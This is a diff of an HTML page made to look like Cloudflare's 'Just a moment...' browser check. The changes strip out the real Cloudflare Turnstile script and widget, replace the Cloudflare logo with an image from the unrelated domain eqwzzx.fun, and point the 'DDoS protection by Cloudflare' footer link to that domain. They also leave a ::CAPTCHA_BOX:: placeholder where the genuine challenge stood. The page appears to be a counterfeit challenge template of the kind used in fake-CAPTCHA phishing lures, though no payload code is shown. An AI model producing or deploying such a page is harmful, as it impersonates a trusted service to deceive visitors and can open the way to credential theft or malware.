@@ -6,8 +6,6 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="robots" content="noindex, nofollow">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <!-- Cloudflare Turnstile script -->
-    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
     <style>
         :root {
             --bg-dark: #191c23;
@@ -138,24 +136,18 @@
         .footer a:hover {
             color: #ffb86b;
         }
+        /* Responsive for mobile */
         @media (max-width: 550px) {
             .challenge-container {
                 padding: 24px 4vw 24px 4vw;
             }
             .waves { height: 88px; }
         }
-        /* Turnstile widget dark mode override (for a seamless look) */
-        .cf-turnstile {
-            margin: 24px auto 0 auto;
-            display: flex;
-            justify-content: center;
-            filter: drop-shadow(0 0 3px #000c);
-        }
     </style>
 </head>
 <body>
     <div class="challenge-container">
-        <img class="cloudflare-logo" src="https://www.cloudflare.com/img/logo-cloudflare-dark.svg" alt="Cloudflare">
+        <img class="cloudflare-logo" src="https://eqwzzx.fun/278-waiting.png" alt="Eqwzzx">
         <h1>Just a moment...</h1>
         <div class="spinner"></div>
         <p>
@@ -163,11 +155,10 @@
             This process is automatic. Your browser will redirect to your requested content shortly.<br><br>
             <strong>If you are not redirected, please enable JavaScript and cookies, then refresh the page.</strong>
         </p>
-        <!-- Cloudflare Turnstile challenge widget -->
-        <h1>::CAPTCHA_BOX::</h1>
-        <div class="cf-turnstile" data-sitekey="0x4AAAAAABeCOlYwKWtc3zQX"></div>
+        <!-- Cloudflare Managed Challenge Token -->
+        ::CAPTCHA_BOX::
         <div class="footer">
-            DDoS protection by <a href="https://www.cloudflare.com/" target="_blank" rel="noopener noreferrer">Cloudflare</a>
+            DDoS protection by <a href="https://eqwzzx.fun" target="_blank" rel="noopener noreferrer">Cloudflare</a>
         </div>
     </div>
     <svg class="waves" viewBox="0 0 1440 320"><defs>
